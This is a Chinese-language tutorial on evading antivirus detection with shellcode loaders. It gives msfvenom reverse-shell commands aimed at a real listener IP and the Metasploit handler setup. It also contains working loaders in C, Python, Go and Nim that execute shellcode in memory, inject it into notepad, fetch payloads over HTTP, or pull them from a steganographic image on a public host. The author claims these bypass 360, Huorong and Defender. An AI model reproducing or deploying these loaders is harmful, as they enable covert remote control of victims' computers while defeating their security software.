![](https://s3.bmp.ovh/imgs/2023/05/11/44ddfef1c068c942.png)

#### 静态免杀-二进制免杀

### C/C++

msf和cs的payload生成

msf

~~~
//生成一个监听端口是10001，格式是c的tcp反弹shell木马
msfvenom -p windows/x64/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 64-1.c
~~~

[![pphR0v8.png](https://s1.ax1x.com/2023/04/03/pphR0v8.png)](https://imgse.com/i/pphR0v8)

~~~
//开启
msfconsole

// 生成反弹shell木马x64
msfvenom -p windows/x64/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 64-1.c
// 生成反弹shell木马x32
msfvenom -p windows/x32/meterpreter/reverse_tcp lport=10001 lhost=129.226.92.29 -f c -o 32-3.c



//开启监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
// set payload windows/meterpreter/reverse_tcp  32位
set lhost 129.226.92.29
set lport 10001
exploit
~~~



常见加载代码

~~~c++
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

unsigned char buf[] =
"";


int main()

{

	//((void(WINAPI*)(void))&buf)();

	//char* Memory;
	//Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//memcpy(Memory, buf, sizeof(buf));
	//((void(*)())Memory)();

	__asm {
		lea eax, buf
		call eax
	}

	//__asm{
	//mov eax, offset shellcode
	//_emit 0xFF
	//_emit 0xE0
	//}

}

~~~







可以对shellcode或者代码加载进行处理

这里针对shellcode混淆加密可以使用

~~~
对shell.bin进行混淆
xor aes rsa bc4 hex 
~~~



### python

但是可能在别的机器上因为没用编译环境无法运行，或者python版本不一样

~~~
shellcode 执行代码 打包器

使用cs的加载上线
~~~

~~~python
import ctypes

# 64位
shellcode = b""


ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
~~~

[![pp4YQfA.png](https://s1.ax1x.com/2023/04/04/pp4YQfA.png)](https://imgse.com/i/pp4YQfA)



~~~
shellcode加密器和解密器
xor aes rsa bc4 hex 等
~~~

#### 打包器

##### pyinstaller

~~~python
# Pyinstaller
pip3 install pyinstaller
pyinstaller -D -w 源程序.py

pyinstaller.exe -F file_1.py
~~~

##### py2exe

~~~python
from distutils.core import setup
import py2exe
 
INCLUDES = ['108-pickle-release']
 
options = {
    "py2exe":
        {
            "compressed": 1,  # 0或1,1压缩，0不压缩
            "optimize": 2,  # 0、1、2，文件的优化级别
            "bundle_files": 1,  # 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定
            "includes": INCLUDES,  # 列表，包含其它的一些模块
            "dll_excludes": ['MSVCP90.dll']  # 列表，包含的dll文件不会打包进exe程序
        }
}
setup(
    version='1.0.0',
    options=options,
    description="this is a xiaodi test",
    zipfile=None,  # 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中
    console=[{"script": '108-pickle-release.py'}]  # 生成一个控制台形式的exe程序，对应的有windows=[]，生成GUI形式的exe程序
)
~~~

~~~
pip3 install py2exe
python setup.py py2exe
~~~







##### Nuitka(免杀效果最好)

~~~
pip3 install Nuitka
nuitka  32-python.py

nuitka --mingw64 --standalone --show-progress --show-memory --enable-plugin=pyqt5 --follow-import-to=need --output-dir=out 32-python.py

nuitka --mingw64 --standalone --show-progress --show-memory --enable-plugin=pyqt5 --output-dir=out 32-python.py
~~~





~~~
aes + pyinstaller 过 wd(vt很高)
反序列化 + pyinstaller 过 360(vt很高)

~~~



### powershell

~~~
.ps1
命令行

~~~



##### 分离免杀/无文件落地



~~~
xxx.xxx/123.text
~~~



~~~
1)http请求获取
2)参数获取
3)资源获取
~~~

### C#

..

### golang

~~~go
//编译生成exe
go build -o add.exe 1.go
~~~

~~~
// 将 c 代码 的\改成,0
shellcode_buf = []byte{
		0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30,
	}
~~~







~~~
//同时过360和火绒  3.1.exe
D:\goland\file\file1\src\lighting.cn
go run 3.go shellcode
go build xxx.go key aes
~~~

[![pp4Li4K.png](https://s1.ax1x.com/2023/04/04/pp4Li4K.png)](https://imgse.com/i/pp4Li4K)





### ASM

免杀效果很好

https://forum.butian.net/share/1536



### JAVA

~~~
//msf生成jar包
msfvenom -p java/meterpreter/reverse_tcp lhost=3D129.226.92.29 lport=9999  -f jar -o msf.jar
~~~

[![pp4vJJ0.png](https://s1.ax1x.com/2023/04/04/pp4vJJ0.png)](https://imgse.com/i/pp4vJJ0)

~~~
//打包成字节码
javac main.java
//编译
jar -jar cvfm xxx.jar META-INF/MANIFEST.MF
~~~

https://www.jb51.net/article/236000.htm

~~~
1)有java环境，运行jar -starw xxx.jar

2)无java环境，编译成exe

~~~









### 无文件落地/加载器分离/内存免杀

~~~
杀软：
1）模拟执行
2）反编译逆向
~~~



~~~
1)从文本中加载shellcode
2)加载器参数提取
3)远程协议加载，比如远程加载http://123.com/1.txt
4)将shellcode从管道传输
5)将shellcode隐写进入图片内
~~~



~~~
如果用python实现记得python的编译器是64位还是32位的，对应的shellcode也应该改
~~~



##### 1)从文本中加载shellcode

加载s.txt文件上线

~~~python
import ctypes
import base64

with open('s.txt','r') as f:
    s=f.read()
s=s.replace('zxczx','')
shellcode=base64.b64decode(s)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
~~~

[![ppIcvnS.png](https://s1.ax1x.com/2023/04/06/ppIcvnS.png)](https://imgse.com/i/ppIcvnS)



##### 2)加载器参数提取

~~~python
import ctypes
import sys,base64


if __name__ == '__main__':
    s=sys.argv[1]
    sc=base64.b64decode(s)
    z=sys.argv[2]
    zx=base64.b64decode(z)
    exec(zx)

~~~



##### 3)远程协议加载

~~~python
import ctypes,requests,base64

def g():
    all=requests.get('http://192.168.43.86/all.txt').text
    return all

if __name__ == '__main__':
    all=base64.b64decode(g())
    exec(all)
~~~

要么换打包器，要么换请求库

~~~python
import ctypes,requests,base64
from urllib.request import urlopen

def g():
    all=urlopen('http://192.168.43.86/all.txt').read()
    return all

if __name__ == '__main__':
    all=base64.b64decode(g())
    exec(all)

~~~











##### 4)将shellcode从管道传输

client

~~~python
import socket

client = socket.socket()
client.connect(("192.168.1.107", 9999))

while True:
    cmd = input(">>>:").strip()
    if len(cmd) == 0: continue
    client.send(cmd.encode("utf-8"))
    cmd_res_size = client.recv(1024)  # 接收命令的长度
    print("命令结果大小：", cmd_res_size.decode())
    recevied_size = 0  # 接收客户端发来数据的计算器
    recevied_data = b''  # 客户端每次发来内容的计数器
    while recevied_size < int(cmd_res_size.decode()):  # 当接收的数据大小 小于 客户端发来的数据
        cmd_res = client.recv(1024)
        recevied_size += len(cmd_res)  # 每次收到的服务端的数据有可能小于1024，所以必须用len判断
        recevied_data += cmd_res
    else:
        print(recevied_data.decode("utf-8", "ignore"))
        print("cmd res receive done ....", recevied_size)

client.close()
~~~

server

~~~python
# -*- coding:utf-8 -*-
__author__ = 'xiaodi'

import socket,base64,ctypes,os
server=socket.socket()


def zx(data):
    sc=base64.b64decode(data+b'w4XAdeVYw+ip/f//NDcuOTQuMjM2LjExNwAAAYag')
    print(sc)
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
    return sc


server = socket.socket()
server.bind(("0.0.0.0",9999))
server.listen(5)
while True:
    conn,addr = server.accept()
    print("new addr:",addr)
    while True:
        data = conn.recv(1024)
        if not data:
            print("客户端已断开")
            break
        print("执行指令：",data)
        zx(data)
        if len(cmd_res) == 0:
            cmd_res = "cmd has no output...."
        conn.send( str(len(cmd_res.encode())).encode() )  #发送服务端发送给客户端数据的长度
        conn.send(cmd_res.encode("utf-8"))   #发送服务端的数据
        print("send done")
server.close()
~~~

##### 5)将shellcode隐写进入图片内

image-1.py

~~~
python image-1.py -e 123.png xxxxx
~~~

~~~~
python image-1.py -d encodedImage.png
~~~~

~~~python
#!/usr/bin/env python3
#coding=utf-8

"""Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) <originImage> [<text>] [<encodedImage>]
    imageEncoding (-d|decode) <encodedImage>

Options:
    -h,--help   显示帮助菜单
    -e          加密
    -d          解密

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
"""

from PIL import Image
from docopt import docopt


"""
取得一个 PIL 图像并且更改所有值为偶数（使最低有效位为 0）
"""
def RGBAmakeImageEven(image):
    pixels = list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]
    evenPixels = [(r>>1<<1,g>>1<<1,b>>1<<1,t>>1<<1) for [r,g,b,t] in pixels]  # 更改所有值为偶数（魔法般的移位）
    evenImage = Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本
    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本
    return evenImage

def RGBmakeImageEven(image):
    pixels = list(image.getdata())  # 得到一个这样的列表： [(r,g,b,t),(r,g,b,t)...]
    evenPixels = [(r>>1<<1,g>>1<<1,b>>1<<1) for [r,g,b] in pixels]  # 更改所有值为偶数（魔法般的移位）
    evenImage = Image.new(image.mode, image.size)  # 创建一个相同大小的图片副本
    evenImage.putdata(evenPixels)  # 把上面的像素放入到图片副本
    return evenImage

"""
内置函数 bin() 的替代，返回固定长度的二进制字符串
"""
def constLenBin(int):
    binary = "0"*(8-(len(bin(int))-2))+bin(int).replace('0b','')  # 去掉 bin() 返回的二进制字符串中的 '0b'，并在左边补足 '0' 直到字符串长度为 8
    return binary

"""
将字符串编码到图片中
"""
def RGBAencodeDataInImage(image, data):
    evenImage = RGBAmakeImageEven(image)  # 获得最低有效位为 0 的图片副本
    binary = ''.join(map(constLenBin,bytearray(data, 'utf-8'))) # 将需要被隐藏的字符串转换成二进制字符串
    if len(binary) > len(image.getdata()) * 4:  # 如果不可能编码全部数据， 抛出异常
        raise Exception("Error: Can't encode more than " + len(evenImage.getdata()) * 4 + " bits in this image. ")
    encodedPixels = [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 < len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里
    encodedImage = Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素
    encodedImage.putdata(encodedPixels)  # 添加编码后的数据
    return encodedImage

def RGBencodeDataInImage(image, data):
    evenImage = RGBmakeImageEven(image)  # 获得最低有效位为 0 的图片副本
    binary = ''.join(map(constLenBin,bytearray(data, 'utf-8'))) # 将需要被隐藏的字符串转换成二进制字符串
    if len(binary)%3 != 0:  # 将转换的比特流数据末位补零，使其长度为3的倍数，防止其在下面重新编码的过程中发生越界
        rema = len(binary)%3
        binary = binary+('0'*(3-rema))
#        print(len(binary))
    if len(binary) > len(image.getdata()) * 3:  # 如果不可能编码全部数据， 抛出异常
        raise Exception("Error: Can't encode more than " + len(evenImage.getdata()) * 3 + " bits in this image. ")
    # evenImageList = list(evenImage.getdata())

    # for index in range(len(evenImageList)):
    #     if index*3 < len(binary):
    #         tup = evenImageList[index]
    #         r = tup[0]
    #         g = tup[1]
    #         b = tup[2]
    #         r += int(binary[index*3+0])
    #         evenImageList[index] = (r,g,b)
    #     else:
    #         break
    #     if index*3+1 < len(binary):
    #         tup = evenImageList[index]
    #         r = tup[0]
    #         g = tup[1]
    #         b = tup[2]
    #         g += int(binary[index*3+1])
    #         evenImageList[index] = (r,g,b)
    #     else:
    #         break
    #     if index*3+2 < len(binary):
    #         tup = evenImageList[index]
    #         r = tup[0]
    #         g = tup[1]
    #         b = tup[2]
    #         b += int(binary[index*3+2])
    #         evenImageList[index] = (r,g,b)
    #     else:
    #         break
    #     index += 1
    # encodedPixels = evenImageList
    encodedPixels = [(r+int(binary[index*3+0]),g+int(binary[index*3+1]),b+int(binary[index*3+2])) if index*3 < len(binary) else (r,g,b) for index, (r,g,b) in enumerate(list(evenImage.getdata()))] # 将 binary 中的二进制字符串信息编码进像素里
    encodedImage = Image.new(evenImage.mode, evenImage.size)  # 创建新图片以存放编码后的像素
    encodedImage.putdata(encodedPixels)  # 添加编码后的数据
    return encodedImage

"""
从二进制字符串转为 UTF-8 字符串
"""
def binaryToString(binary):
    index = 0
    string = []
    rec = lambda x, i: x[2:8] + (rec(x[8:], i-1) if i > 1 else '') if x else ''
    # rec = lambda x, i: x and (x[2:8] + (i > 1 and rec(x[8:], i-1) or '')) or ''
    fun = lambda x, i: x[i+1:8] + rec(x[8:], i-1)
    while index + 1 < len(binary):
        chartype = binary[index:].index('0') # 存放字符所占字节数，一个字节的字符会存为 0
        length = chartype*8 if chartype else 8
        string.append(chr(int(fun(binary[index:index+length],chartype),2)))
        index += length
    return ''.join(string)

"""
解码隐藏数据
"""
def RGBAdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b))+str(int(t>>1<<1!=t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def RGBdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def isTextFile(path):
    if path.endswith(".txt"):
        return True
    elif path.endswith(".m"):
        return True
    elif path.endswith(".h"):
        return True
    elif path.endswith(".c"):
        return True
    elif path.endswith(".py"):
        return True
    else:
        return False

if __name__ == '__main__':
    """command-line interface"""
    arguments = docopt(__doc__)
#    print(arguments)

    if arguments['-e'] or arguments['encode']:
        if arguments['<text>'] is None:
            arguments['<text>'] = "待加密的文本"
        if arguments['<encodedImage>'] is None:
            arguments['<encodedImage>'] = "encodedImage.png"

        if isTextFile(arguments['<text>']):
            with open(arguments['<text>'], 'rt') as f:
                arguments['<text>'] = f.read()

        print("载体图片:")
        print(arguments['<originImage>']+"\n")
        print("待加密密文:")
        print(arguments['<text>']+"\n")
        print("加密后图片:")
        print(arguments['<encodedImage>']+"\n")
        print("加密中……\n")
        im = Image.open(arguments['<originImage>'])
        if im.mode == 'RGBA':
            RGBAencodeDataInImage(im, arguments['<text>']).save(arguments['<encodedImage>'])
        # elif im.mode == 'RGB':
        #     RGBencodeDataInImage(im, arguments['<text>']).save(arguments['<encodedImage>'])
        else:
            print("暂不支持此图片格式……")

        print("加密完成,密文为：\n"+arguments['<text>']+"\n")
    elif arguments['-d'] or arguments['decode']:
        print("解密中……\n")
        im = Image.open(arguments['encodedImage.png'])
        if im.mode == 'RGBA':
            print("解秘完成，密文为：\n"+RGBAdecodeImage(im)+"\n")


        # elif im.mode == 'RGB':
        #     print("解秘完成，密文为：\n"+RGBdecodeImage(im)+"\n")
        else:
            print("非法的图片格式……")
~~~

image-2.py

~~~python
#!/usr/bin/env python3
#coding=utf-8

"""Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) <originImage> [<text>] [<encodedImage>]
    imageEncoding (-d|decode) <encodedImage>

Options:
    -h,--help   显示帮助菜单
    -e          加密
    -d          解密

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
"""

from PIL import Image
from docopt import docopt
import base64,ctypes



"""
内置函数 bin() 的替代，返回固定长度的二进制字符串
"""
def constLenBin(int):
    binary = "0"*(8-(len(bin(int))-2))+bin(int).replace('0b','')  # 去掉 bin() 返回的二进制字符串中的 '0b'，并在左边补足 '0' 直到字符串长度为 8
    return binary

"""
将字符串编码到图片中
"""


"""
从二进制字符串转为 UTF-8 字符串
"""
def binaryToString(binary):
    index = 0
    string = []
    rec = lambda x, i: x[2:8] + (rec(x[8:], i-1) if i > 1 else '') if x else ''
    # rec = lambda x, i: x and (x[2:8] + (i > 1 and rec(x[8:], i-1) or '')) or ''
    fun = lambda x, i: x[i+1:8] + rec(x[8:], i-1)
    while index + 1 < len(binary):
        chartype = binary[index:].index('0') # 存放字符所占字节数，一个字节的字符会存为 0
        length = chartype*8 if chartype else 8
        string.append(chr(int(fun(binary[index:index+length],chartype),2)))
        index += length
    return ''.join(string)

"""
解码隐藏数据
"""
def RGBAdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b))+str(int(t>>1<<1!=t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def RGBdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def isTextFile(path):
    if path.endswith(".txt"):
        return True
    elif path.endswith(".m"):
        return True
    elif path.endswith(".h"):
        return True
    elif path.endswith(".c"):
        return True
    elif path.endswith(".py"):
        return True
    else:
        return False

if __name__ == '__main__':
    """command-line interface"""
    #arguments = docopt(__doc__)
    im = Image.open('encodedImage.png')
    print("解秘完成，密文为：\n"+RGBAdecodeImage(im)+"\n")
    func=base64.b64decode(RGBAdecodeImage(im))
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(func), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(func),len(func))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
~~~

[![ppIqwX4.png](https://s1.ax1x.com/2023/04/06/ppIqwX4.png)](https://imgse.com/i/ppIqwX4)



使用第三种和第五种的组合方式：将shellcode隐写在图片中放在图床上然后下载到本地再加载，代码

~~~python
url = 'https://s1.ax1x.com/2023/04/06/ppo1GQ0.png'
urllib.request.urlretrieve(url, 'encodedImage.png')

# 打开本地图片
im = Image.open('encodedImage.png')
~~~

全部代码

~~~python
#!/usr/bin/env python3
#coding=utf-8

"""Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) <originImage> [<text>] [<encodedImage>]
    imageEncoding (-d|decode) <encodedImage>

Options:
    -h,--help   显示帮助菜单
    -e          加密
    -d          解密

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
"""

from PIL import Image
from docopt import docopt
import base64,ctypes
import urllib.request



"""
内置函数 bin() 的替代，返回固定长度的二进制字符串
"""
def constLenBin(int):
    binary = "0"*(8-(len(bin(int))-2))+bin(int).replace('0b','')  # 去掉 bin() 返回的二进制字符串中的 '0b'，并在左边补足 '0' 直到字符串长度为 8
    return binary

"""
将字符串编码到图片中
"""


"""
从二进制字符串转为 UTF-8 字符串
"""
def binaryToString(binary):
    index = 0
    string = []
    rec = lambda x, i: x[2:8] + (rec(x[8:], i-1) if i > 1 else '') if x else ''
    # rec = lambda x, i: x and (x[2:8] + (i > 1 and rec(x[8:], i-1) or '')) or ''
    fun = lambda x, i: x[i+1:8] + rec(x[8:], i-1)
    while index + 1 < len(binary):
        chartype = binary[index:].index('0') # 存放字符所占字节数，一个字节的字符会存为 0
        length = chartype*8 if chartype else 8
        string.append(chr(int(fun(binary[index:index+length],chartype),2)))
        index += length
    return ''.join(string)

"""
解码隐藏数据
"""
def RGBAdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b))+str(int(t>>1<<1!=t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def RGBdecodeImage(image):
    pixels = list(image.getdata())  # 获得像素列表
    binary = ''.join([str(int(r>>1<<1!=r))+str(int(g>>1<<1!=g))+str(int(b>>1<<1!=b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据
    # 找到数据截止处的索引
    locationDoubleNull = binary.find('0000000000000000')
    endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull
    data = binaryToString(binary[0:endIndex])
    return data

def isTextFile(path):
    if path.endswith(".txt"):
        return True
    elif path.endswith(".m"):
        return True
    elif path.endswith(".h"):
        return True
    elif path.endswith(".c"):
        return True
    elif path.endswith(".py"):
        return True
    else:
        return False

if __name__ == '__main__':
    """command-line interface"""
    #arguments = docopt(__doc__)
    # im = Image.open('encodedImage.png')  https://s1.ax1x.com/2023/04/06/ppo1GQ0.png
    #    im = Image.open('https://s1.ax1x.com/2023/04/06/ppo1GQ0.png')
    # print("解秘完成，密文为：\n"+RGBAdecodeImage(im)+"\n")
    # all=requests.get('http://192.168.43.86/all.txt').text
    url = 'https://s1.ax1x.com/2023/04/06/ppo1GQ0.png'
    urllib.request.urlretrieve(url, 'encodedImage.png')
    im = Image.open('encodedImage.png')


    func=base64.b64decode(RGBAdecodeImage(im))
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(func), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(func),len(func))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
~~~

让好朋友试试

[![pposNgf.png](https://s1.ax1x.com/2023/04/06/pposNgf.png)](https://imgse.com/i/pposNgf)

[![pposdKS.png](https://s1.ax1x.com/2023/04/06/pposdKS.png)](https://imgse.com/i/pposdKS)













~~~
分离免杀 + uuid/mac/ipv4 + 加壳
~~~





### 内存加载

~~~
uuid mac ipv4
~~~





### Nim免杀

https://github.com/byt3bl33d3r/OffensiveNim

~~~
//将目标文件编译成c语言
nim c test.nim
//
nim cpp test.nim

//编译64位
nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:size --passc=flto --passl=flto test.nim
//编译32位
nim c -d:mingw --app:gui
~~~



比如

~~~nim
#[
    Author: HopScotch, Twitter: @0xHop
    License: BSD 3-Clause
]#

import winim/lean
import osproc


proc RunFiber[I, T](shellcode: array[I, T]): void =
    let MasterFiber = ConvertThreadToFiber(NULL)
    let vAlloc = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory( pHandle, vAlloc, unsafeaddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](vAlloc), NULL)
    SwitchToFiber(xFiber)



when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb]

    elif defined(amd64):
        echo "[*] Running in x64 process"
        var shellcode: array[892, byte] = [
        byte 0xfc, 0x48]

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        RunFiber(shellcode)

~~~

这里切记文件名不能太简单，且一定要看到生成的shellcode的大小，如图

[![ppoeh7R.png](https://s1.ax1x.com/2023/04/06/ppoeh7R.png)](https://imgse.com/i/ppoeh7R)

[![ppoe5A1.png](https://s1.ax1x.com/2023/04/06/ppoe5A1.png)](https://imgse.com/i/ppoe5A1)

成功上线

[![ppoeH1O.png](https://s1.ax1x.com/2023/04/06/ppoeH1O.png)](https://imgse.com/i/ppoeH1O)

加个壳直接绕过火绒等

换一种上线方式

~~~nim
import winim/lean
import osproc
import httpclient
import winim/com
import base64

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when defined(windows):
    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(amd64):
        var shellcode: array[892, byte] = [byte 0xfc, 0x48]                                                                                  
        echo shellcode                                                              
        

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        injectCreateRemoteThread(shellcode)

~~~

[![ppon1Rf.png](https://s1.ax1x.com/2023/04/06/ppon1Rf.png)](https://imgse.com/i/ppon1Rf)

##### 配合加载分离

~~~
从其他文件加载shellcode
~~~

~~~nim
import winim/lean
import osproc
import stew/byteutils
import os
import strutils

proc shellcodeCallback(shellcode: openarray[byte]): void =
    let tProcess = GetCurrentProcessId()
    echo "Powered by StudyCat"
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
    
    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 


proc main() =    
    if fileExists(paramStr(1)):
        var 
            filename = paramStr(1)
            file: File
            
        file = open(filename, fmRead)
        var fileSize = file.getFileSize() 
        var shellcode = newSeq[byte](fileSize)
        discard file.readBytes(shellcode, 0, fileSize)
        shellcodeCallback(shellcode)
        file.close()
    else:
        var hexstr: string = paramStr(1)
        var shellcode = newSeq[byte](len(hexstr) div 2)
        hexToByteArray(hexstr, shellcode)
        shellcodeCallback(shellcode)    
    
when defined(windows):
    if 2 > 1:
        if paramCount() > 0 :           
            main()
        else:
            let pathSplit = splitPath(paramStr(0))
            echo "Usage: ", pathSplit.tail, " fce88900000...648b52308b"
            echo "Usage: ", pathSplit.tail, " beacon.bin"    
   
~~~

记得nim-stew-master解压后复制stew到运行目录下即可

###### 1-采用batmanfuture.exe xxx.bin

加载文件上线

[![ppoM4Wq.png](https://s1.ax1x.com/2023/04/06/ppoM4Wq.png)](https://imgse.com/i/ppoM4Wq)

但是这种对xxx.bin也要免杀，可以试第二种命令行

###### 2-命令行

用msf生成payload

